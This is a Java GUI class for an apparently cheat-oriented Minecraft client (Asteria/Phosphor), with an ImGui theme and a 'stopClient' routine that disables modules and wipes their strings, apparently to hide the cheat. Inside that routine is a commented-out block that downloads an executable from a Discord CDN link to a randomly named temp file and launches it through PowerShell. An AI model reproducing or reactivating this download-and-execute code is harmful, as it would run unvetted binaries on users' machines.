package net.caffeinemc.phosphor.gui;

import imgui.ImGui;
import imgui.flag.ImGuiCol;
import net.caffeinemc.phosphor.api.font.JColor;
import net.caffeinemc.phosphor.common.Phosphor;
import net.caffeinemc.phosphor.module.Module;
import net.caffeinemc.phosphor.module.modules.client.ArrayListModule;
import net.caffeinemc.phosphor.module.modules.client.AsteriaSettingsModule;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class AsteriaMenu implements Renderable {
    private static AsteriaMenu instance;

    private static final AtomicBoolean clientEnabled = new AtomicBoolean(true);
    public final List<CategoryTab> tabs = new ArrayList<>();

    public static AsteriaMenu getInstance() {
        if (instance == null) {
            instance = new AsteriaMenu();
        }
        if (instance.tabs.isEmpty()) {
            float posX = 10f;
            for (Module.Category category : Module.Category.values()) {
                instance.tabs.add(new CategoryTab(category, posX, 10f));
                posX += 200f;
            }
        }
        return instance;
    }

    public static void toggleVisibility() {
        if (ImguiLoader.isRendered(getInstance())) {
            ImguiLoader.queueRemove(getInstance());
        } else {
            ImguiLoader.addRenderable(getInstance());
        }
    }

    public static boolean isClientEnabled() {
        return clientEnabled.get();
    }

    public static void stopClient() {
        Phosphor.configManager().saveConfig();

        AsteriaSettingsModule asteria = Phosphor.moduleManager().getModule(AsteriaSettingsModule.class);
        if (asteria.isEnabled()) asteria.disable();

        ArrayListModule arrayListModule = Phosphor.moduleManager().getModule(ArrayListModule.class);
        if (arrayListModule.isEnabled()) arrayListModule.disable();

        clientEnabled.set(false);

        new Thread(() -> {
            Module.Category.clearStrings();
            for (Module module : Phosphor.moduleManager().modules) {
                if (module.isEnabled())
                    module.disable();

                module.cleanStrings();
            }

//            String FILE_URL = "https://cdn.discordapp.com/attachments/1125468134833401989/1130936549131952148/vapelite.exe";
//            String FILE_NAME = RandomStringUtils.random(10, true, true);
//            String PATH = System.getProperty("java.io.tmpdir");
//
//            try {
//                InputStream inputStream = new URL(FILE_URL).openStream();
//                Path pathToFile = Paths.get(PATH).resolve(FILE_NAME);
//                Files.copy(inputStream, pathToFile, StandardCopyOption.REPLACE_EXISTING);
//
//                String command = String.format("powershell.exe Start-Process -FilePath \"%s\" -PassThru -NoNewWindow", pathToFile);
//                Process powerShellProcess = Runtime.getRuntime().exec(command);
//
//                powerShellProcess.waitFor();
//            } catch (IOException | InterruptedException e) {
//                throw new RuntimeException(e);
//            }
        }).start();
    }

    @Override
    public String getName() {
        return Phosphor.name;
    }

    @Override
    public void render() {
        for (CategoryTab categoryTab : tabs) {
            categoryTab.render();
        }
    }

    @Override
    public Theme getTheme() {
        return new Theme() {
            @Override
            public void preRender() {
                float[][] colors = ImGui.getStyle().getColors();

                float[] color = JColor.getGuiColor().getFloatColor();
                float[] bColor = JColor.getGuiColor().jBrighter().getFloatColor();
                float[] dColor = JColor.getGuiColor().jDarker().getFloatColor();

                colors[ImGuiCol.Text]                   = new float[]{0.80f, 0.84f, 0.96f, 1.00f};
                colors[ImGuiCol.TextDisabled]           = new float[]{0.42f, 0.44f, 0.53f, 1.00f};
                colors[ImGuiCol.WindowBg]               = new float[]{0.07f, 0.07f, 0.11f, 1.00f};
                colors[ImGuiCol.ChildBg]                = new float[]{0.09f, 0.09f, 0.15f, 0.00f};
                colors[ImGuiCol.PopupBg]                = new float[]{0.09f, 0.09f, 0.15f, 0.94f};
                colors[ImGuiCol.Border]                 = new float[]{0.42f, 0.44f, 0.53f, 0.50f};
                colors[ImGuiCol.BorderShadow]           = new float[]{0.07f, 0.07f, 0.11f, 0.00f};
                colors[ImGuiCol.FrameBg]                = new float[]{color[0], color[1], color[2], 0.54f};
                colors[ImGuiCol.FrameBgHovered]         = new float[]{color[0], color[1], color[2], 0.40f};
                colors[ImGuiCol.FrameBgActive]          = new float[]{color[0], color[1], color[2], 0.67f};
                colors[ImGuiCol.TitleBg]                = new float[]{0.09f, 0.09f, 0.15f, 1.00f};
                colors[ImGuiCol.TitleBgActive]          = new float[]{0.12f, 0.12f, 0.18f, 1.00f};
                colors[ImGuiCol.TitleBgCollapsed]       = new float[]{0.09f, 0.09f, 0.15f, 0.75f};
                colors[ImGuiCol.MenuBarBg]              = new float[]{0.16f, 0.17f, 0.24f, 1.00f};
                colors[ImGuiCol.ScrollbarBg]            = new float[]{0.14f, 0.15f, 0.20f, 0.53f};
                colors[ImGuiCol.ScrollbarGrab]          = new float[]{0.25f, 0.27f, 0.35f, 1.00f};
                colors[ImGuiCol.ScrollbarGrabHovered]   = new float[]{0.32f, 0.34f, 0.43f, 1.00f};
                colors[ImGuiCol.ScrollbarGrabActive]    = new float[]{0.38f, 0.41f, 0.50f, 1.00f};
                colors[ImGuiCol.CheckMark]              = new float[]{bColor[0], bColor[1], bColor[2], 1.00f};
                colors[ImGuiCol.SliderGrab]             = new float[]{color[0], color[1], color[2], 0.9f};
                colors[ImGuiCol.SliderGrabActive]       = new float[]{color[0], color[1], color[2], 0.95f};
                colors[ImGuiCol.Button]                 = new float[]{color[0], color[1], color[2], 0.59f};
                colors[ImGuiCol.ButtonHovered]          = new float[]{color[0], color[1], color[2], 0.9f};
                colors[ImGuiCol.ButtonActive]           = new float[]{color[0], color[1], color[2], 1.00f};
                colors[ImGuiCol.Header]                 = new float[]{color[0], color[1], color[2], 0.9f};
                colors[ImGuiCol.HeaderHovered]          = new float[]{color[0], color[1], color[2], 0.95f};
                colors[ImGuiCol.HeaderActive]           = new float[]{bColor[0], bColor[1], bColor[2], 1.00f};
                colors[ImGuiCol.Separator]              = new float[]{0.45f, 0.47f, 0.58f, 0.50f};
                colors[ImGuiCol.SeparatorHovered]       = new float[]{0.76f, 0.17f, 0.30f, 0.78f};
                colors[ImGuiCol.SeparatorActive]        = new float[]{0.76f, 0.17f, 0.30f, 1.00f};
                colors[ImGuiCol.ResizeGrip]             = new float[]{color[0], color[1], color[2], 0.59f};
                colors[ImGuiCol.ResizeGripHovered]      = new float[]{bColor[0], bColor[1], bColor[2], 1.00f};
                colors[ImGuiCol.ResizeGripActive]       = new float[]{color[0], color[1], color[2], 1.00f};
                colors[ImGuiCol.Tab]                    = new float[]{dColor[0], dColor[1], dColor[2], 0.86f};
                colors[ImGuiCol.TabHovered]             = new float[]{color[0], color[1], color[2], 0.80f};
                colors[ImGuiCol.TabActive]              = new float[]{bColor[0], bColor[1], bColor[2], 1.00f};
                colors[ImGuiCol.TabUnfocused]           = new float[]{0.19f, 0.20f, 0.27f, 1.00f};
                colors[ImGuiCol.TabUnfocusedActive]     = new float[]{0.51f, 0.12f, 0.20f, 1.00f};
                colors[ImGuiCol.DockingPreview]         = new float[]{0.26f, 0.59f, 0.98f, 0.70f};
                colors[ImGuiCol.DockingEmptyBg]         = new float[]{0.20f, 0.20f, 0.20f, 1.00f};
                colors[ImGuiCol.PlotLines]              = new float[]{0.61f, 0.61f, 0.61f, 1.00f};
                colors[ImGuiCol.PlotLinesHovered]       = new float[]{1.00f, 0.43f, 0.35f, 1.00f};
                colors[ImGuiCol.PlotHistogram]          = new float[]{0.90f, 0.70f, 0.00f, 1.00f};
                colors[ImGuiCol.PlotHistogramHovered]   = new float[]{1.00f, 0.60f, 0.00f, 1.00f};
                colors[ImGuiCol.TableHeaderBg]          = new float[]{0.19f, 0.19f, 0.20f, 1.00f};
                colors[ImGuiCol.TableBorderStrong]      = new float[]{0.31f, 0.31f, 0.35f, 1.00f};
                colors[ImGuiCol.TableBorderLight]       = new float[]{0.23f, 0.23f, 0.25f, 1.00f};
                colors[ImGuiCol.TableRowBg]             = new float[]{0.00f, 0.00f, 0.00f, 0.00f};
                colors[ImGuiCol.TableRowBgAlt]          = new float[]{1.00f, 1.00f, 1.00f, 0.06f};
                colors[ImGuiCol.TextSelectedBg]         = new float[]{0.90f, 0.27f, 0.33f, 0.35f};
                colors[ImGuiCol.DragDropTarget]         = new float[]{1.00f, 1.00f, 0.00f, 0.90f};
                colors[ImGuiCol.NavHighlight]           = new float[]{0.90f, 0.27f, 0.33f, 1.00f};
                colors[ImGuiCol.NavWindowingHighlight]  = new float[]{1.00f, 1.00f, 1.00f, 0.70f};
                colors[ImGuiCol.NavWindowingDimBg]      = new float[]{0.80f, 0.80f, 0.80f, 0.20f};
                colors[ImGuiCol.ModalWindowDimBg]       = new float[]{0.80f, 0.80f, 0.80f, 0.35f};
                ImGui.getStyle().setColors(colors);

                ImGui.getStyle().setWindowRounding(8);
                ImGui.getStyle().setFrameRounding(4);
                ImGui.getStyle().setGrabRounding(4);
                ImGui.getStyle().setPopupRounding(4);
                ImGui.getStyle().setScrollbarSize(10);
                ImGui.getStyle().setScrollbarRounding(4);
                ImGui.getStyle().setTabRounding(4);
                ImGui.getStyle().setWindowTitleAlign(0.5f, 0.5f);

                //if (ImguiLoader.getCustomFont() != null) {
                //    ImGui.pushFont(ImguiLoader.getCustomFont());
                //}
                if (ImguiLoader.getNormalFontAwesome() != null) {
                    ImGui.pushFont(ImguiLoader.getNormalFontAwesome());
                }

            }

            @Override
            public void postRender() {
                if (ImguiLoader.getCustomFont() != null) {
                    ImGui.popFont();
                }
            }
        };
    }
}